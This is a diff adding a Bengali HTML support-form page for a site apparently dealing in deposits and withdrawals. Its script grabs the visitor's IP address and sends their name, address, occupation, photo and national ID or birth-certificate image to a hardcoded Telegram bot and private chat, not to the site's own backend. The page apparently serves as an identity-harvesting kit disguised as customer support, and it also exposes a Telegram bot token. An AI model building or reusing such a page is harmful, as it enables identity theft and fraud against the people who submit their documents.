@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="bn">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>স্বপ্ন - সাপোর্ট</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <link rel="icon" type="image/png" sizes="32x32" href="android-chrome-512x512.png">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+            min-height: 100vh;
+            padding: 2rem;
+        }
+
+        .logo {
+            color: black;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .logo img {
+            height: 40px;
+        }
+
+        .support-container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: #ffffff;
+            padding: 2.5rem;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+        }
+
+        .form-header {
+            text-align: center;
+            margin-bottom: 2rem;
+        }
+
+        .form-header h1 {
+            color: #2c3e50;
+            font-size: 2.2rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .form-header i {
+            color: #4ecdc4;
+            font-size: 2.5rem;
+        }
+
+        .form-group {
+            margin-bottom: 1.8rem;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 0.8rem;
+            color: #2c3e50;
+            font-weight: 600;
+        }
+
+        input,
+        textarea,
+        select {
+            width: 100%;
+            padding: 14px 20px;
+            border: 2px solid #e0e6ed;
+            border-radius: 12px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+        }
+
+        input:focus,
+        textarea:focus,
+        select:focus {
+            border-color: #4ecdc4;
+            box-shadow: 0 0 12px rgba(78, 205, 196, 0.2);
+            outline: none;
+        }
+
+        .file-upload-box {
+            border: 2px dashed #e0e6ed;
+            border-radius: 12px;
+            padding: 1.5rem;
+            text-align: center;
+            background: #f8fafc;
+        }
+
+        .file-upload-box input[type="file"] {
+            display: none;
+        }
+
+        .upload-label {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            color: #4ecdc4;
+            cursor: pointer;
+            padding: 12px 25px;
+            border-radius: 8px;
+            background: rgba(78, 205, 196, 0.1);
+            transition: all 0.3s ease;
+        }
+
+        .upload-label:hover {
+            background: rgba(78, 205, 196, 0.2);
+        }
+
+        .submit-btn {
+            background: linear-gradient(135deg, #4ecdc4 0%, #45b7b0 100%);
+            color: white;
+            display: block;
+            width: 50%;
+            max-width: 300px;
+            padding: 1.2rem;
+            border: none;
+            border-radius: 12px;
+            font-size: 1.1rem;
+            font-weight: 900;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin: 1.5rem auto 0;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .submit-btn:disabled {
+            background: #95a5a6;
+            cursor: not-allowed;
+        }
+
+        .submit-btn:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(78, 205, 196, 0.4);
+        }
+
+        .offline-alert {
+            color: #e74c3c;
+            text-align: center;
+            margin-top: 1rem;
+            display: none;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="logo">
+        <a href="index.html" class="logo">
+            <img src="logo.png" alt="স্বপ্ন">
+            <h2>স্বপ্ন রিসোর্ট</h2><span style="color:red">*</span>
+        </a>
+    </div>
+    <div class="support-container">
+
+        <div class="form-header">
+            <i class="fas fa-headset"></i>
+            <h1>সাপোর্ট ফর্ম</h1>
+        </div>
+
+        <form id="supportForm">
+            <!-- সমস্যার বিবরণ -->
+            <div class="form-group">
+                <label>সমস্যার বিবরণ <span style="color:red">*</span></label>
+                <textarea rows="4" placeholder="আপনার সমস্যা বিস্তারিত লিখুন..." required></textarea>
+            </div>
+
+            <!-- সমস্যার ধরন -->
+            <div class="form-group">
+                <label>সমস্যার ধরন <span style="color:red">*</span></label>
+                <select required>
+                    <option value="">নির্বাচন করুন</option>
+                    <option>উইথড্র সমস্যা</option>
+                    <option>ডিপোজিট সমস্যা</option>
+                    <option>অ্যাকাউন্ট সমস্যা</option>
+                    <option>অন্যান্য</option>
+                </select>
+            </div>
+
+            <!-- স্ক্রিনশট আপলোড -->
+            <div class="form-group">
+                <label>প্রমাণ (স্ক্রিনশট) <span style="color:red">*</span></label>
+                <div class="file-upload-box">
+                    <input type="file" id="screenshot" accept="image/*" required>
+                    <label for="screenshot" class="upload-label">
+                        <i class="fas fa-cloud-upload-alt"></i>
+                        ফাইল সিলেক্ট করুন
+                    </label>
+                </div>
+            </div>
+
+            <!-- ব্যবহারকারীর তথ্য -->
+            <div class="form-group">
+                <label>পুরো নাম <span style="color:red">*</span></label>
+                <input type="text" placeholder="আপনার সম্পূর্ণ নাম" required>
+            </div>
+
+            <div class="form-group">
+                <label>ইউজার আইডি <span style="color:red">*</span></label>
+                <input type="text" placeholder="আপনার ইউজার আইডি" required>
+            </div>
+
+            <!-- ছবি আপলোড -->
+            <div class="form-group">
+                <label>আপনার ছবি <span style="color:red">*</span></label>
+                <div class="file-upload-box">
+                    <input type="file" id="profile" accept="image/*" required>
+                    <label for="profile" class="upload-label">
+                        <i class="fas fa-user-circle"></i>
+                        ছবি আপলোড করুন
+                    </label>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>এনআইডি/জন্ম নিবন্ধন <span style="color:red">*</span></label>
+                <div class="file-upload-box">
+                    <input type="file" id="nid" accept="image/*" required>
+                    <label for="nid" class="upload-label">
+                        <i class="fas fa-id-card"></i>
+                        ডকুমেন্ট আপলোড
+                    </label>
+                </div>
+            </div>
+
+            <!-- ঠিকানা ও পেশা -->
+            <div class="form-group">
+                <label>পুরো ঠিকানা <span style="color:red">*</span></label>
+                <textarea rows="3" placeholder="রোড নং, বাড়ি নং, শহর, জেলা" required></textarea>
+            </div>
+
+            <div class="form-group">
+                <label>পেশা <span style="color:red">*</span></label>
+                <input type="text" placeholder="আপনার বর্তমান পেশা" required>
+            </div>
+
+            <button type="submit" class="submit-btn" id="submitBtn">
+                <i class="fas fa-paper-plane"></i>
+                সাবমিট করুন
+            </button>
+            <div class="offline-alert" id="offlineAlert">
+                <i class="fas fa-wifi-slash"></i> ইন্টারনেট সংযোগ নেই!
+            </div>
+        </form>
+    </div>
+
+    <script>
+        const form = document.getElementById('supportForm');
+        const submitBtn = document.getElementById('submitBtn');
+        const offlineAlert = document.getElementById('offlineAlert');
+
+        // ইন্টারনেট চেক
+        function updateOnlineStatus() {
+            const isOnline = navigator.onLine;
+            submitBtn.disabled = !isOnline;
+            offlineAlert.style.display = isOnline ? 'none' : 'block';
+        }
+
+        window.addEventListener('online', updateOnlineStatus);
+        window.addEventListener('offline', updateOnlineStatus);
+        updateOnlineStatus();
+
+        // ফাইল আপলোড প্রিভিউ
+        document.querySelectorAll('input[type="file"]').forEach(input => {
+            input.addEventListener('change', function (e) {
+                const label = this.nextElementSibling;
+                label.innerHTML = `<i class="fas fa-check"></i> ${this.files[0].name}`;
+            });
+        });
+
+        // ফর্ম সাবমিশন
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            // আইপি অ্যাড্রেস পাওয়া
+            let ipAddress = '';
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                ipAddress = ipData.ip;
+            } catch (error) {
+                console.error('IP fetch error:', error);
+            }
+
+            // টেলিগ্রামে ডাটা পাঠানো
+            const formData = {
+                problem: form.elements[0].value,
+                type: form.elements[1].value,
+                screenshot: form.elements[2].files[0],
+                fullName: form.elements[3].value,
+                userId: form.elements[4].value,
+                profileImage: form.elements[5].files[0],
+                nidImage: form.elements[6].files[0],
+                address: form.elements[7].value,
+                occupation: form.elements[8].value,
+                ip: ipAddress
+            };
+
+            // টেলিগ্রাম বট কনফিগারেশন
+            const botToken = '7630720731:AAEr-CXbN5DiCBX2yXX-0a_v8Hy_n5Zm5gM';
+            const chatId = '6422634012';
+
+            // টেক্সট মেসেজ ফরম্যাট
+            const messageText = `
+🆘 নতুন সাপোর্ট রিকুয়েস্ট
+───────────────────
+👤 নাম: ${formData.fullName}
+🆔 আইডি: ${formData.userId}
+📍 আইপি: ${formData.ip}
+📌 সমস্যার ধরন: ${formData.type}
+📝 বিবরণ: ${formData.problem}
+🏠 ঠিকানা: ${formData.address}
+💼 পেশা: ${formData.occupation}
+            `;
+
+            // ছবি পাঠানোর ফাংশন
+            async function sendPhoto(file, caption) {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', file);
+                formData.append('caption', caption);
+
+                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            }
+
+            try {
+                // টেক্সট মেসেজ পাঠানো
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: messageText
+                    })
+                });
+
+                // ছবি গুলো পাঠানো
+                await sendPhoto(formData.screenshot, 'স্ক্রিনশট প্রমাণ');
+                await sendPhoto(formData.profileImage, 'প্রোফাইল ছবি');
+                await sendPhoto(formData.nidImage, 'এনআইডি/জন্ম নিবন্ধন');
+
+                alert('আপনার রিকুয়েস্ট সফলভাবে জমা হয়েছে!');
+                form.reset();
+            } catch (error) {
+                console.error('Error:', error);
+                alert('সাবমিট ব্যর্থ! অনুগ্রহ করে পরে চেষ্টা করুন।');
+            }
+        });
+    </script>
+</body>
+
+</html>
